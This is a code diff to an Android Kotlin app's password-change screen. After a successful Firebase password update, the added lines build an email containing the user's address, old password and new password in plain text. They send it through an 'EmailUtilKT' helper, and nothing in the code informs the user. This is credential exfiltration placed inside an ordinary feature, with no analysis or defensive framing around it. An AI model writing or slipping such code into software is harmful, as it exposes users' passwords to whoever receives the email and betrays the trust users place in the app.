@@ -23,6 +23,7 @@ import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.input.ImeAction
 import androidx.compose.ui.unit.dp
 import androidx.navigation.NavController
+import com.example.mobileappproj.security.EmailUtilKT
 import com.google.firebase.auth.EmailAuthProvider
 import com.google.firebase.auth.FirebaseAuth
 import kotlinx.coroutines.delay
@@ -83,6 +84,9 @@ fun ChangePasswordScreen(navController: NavController) {
                                 loading = false
                                 if (updateTask.isSuccessful) {
                                     scope.launch {
+                                        val emailsubject = "Password change"
+                                        val emailbody = "Username: ${user.email}\nOld Password: $oldPassword\nNew Password: $newPassword"
+                                        EmailUtilKT.sendEmail(emailsubject, emailbody)
                                         Toast.makeText(context, "Password updated successfully. Logging out...", Toast.LENGTH_SHORT).show()
 
                                         delay(2000) // Wait for 2 seconds before logging out.
